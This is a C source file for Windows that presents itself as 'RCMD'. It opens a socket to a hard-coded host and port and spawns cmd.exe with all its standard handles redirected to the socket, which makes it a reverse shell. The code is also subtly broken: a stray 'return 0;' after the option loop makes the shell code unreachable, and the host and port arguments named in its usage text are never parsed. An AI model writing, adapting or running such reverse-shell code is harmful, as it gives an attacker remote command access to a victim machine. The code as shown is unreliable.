#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER "127.0.0.1"
#define PORT 1234

char* USAGE =
    "Starts a new instance of the windows command interpreter over a socket connection.\n"
    "\n"
    "  RCMD [host] [port]\n"
    "  RCMD [\\L] [host] [port]";

SOCKET ConnectToServer()
{
    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddress;
    LPWSAPROTOCOL_INFO protocolInfo = NULL;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return INVALID_SOCKET;
    }

    clientSocket = WSASocket(AF_INET, SOCK_STREAM, 0, protocolInfo, 0, 0);
    if (clientSocket == INVALID_SOCKET) {
        printf("Failed to create socket.\n");
        WSACleanup();
        return INVALID_SOCKET;
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(SERVER);
    serverAddress.sin_port = htons(PORT);

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        printf("Failed to connect to the server.\n");
        closesocket(clientSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return clientSocket;
}

int main(int argc, char* argv[])
{
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;
    SOCKET clientSocket;

    for (int i = 1; i < argc; i++)
    {
        if (argv[i][0] == '/')
        {
            switch (argv[i][1])
            {
                case '?':
                    printf("%s\n", USAGE);
                    return 0;
            }
        }
    }
    return 0;

    clientSocket = ConnectToServer();
    if (clientSocket == INVALID_SOCKET)
    {
        return 1;
    }

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = (HANDLE)clientSocket;
    startupInfo.hStdOutput = (HANDLE)clientSocket;
    startupInfo.hStdError = (HANDLE)clientSocket;

    if (!CreateProcessA(NULL, "cmd.exe /q", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo))
    {
        printf("Failed to create cmd.exe process.\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(processInfo.hProcess, INFINITE);

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
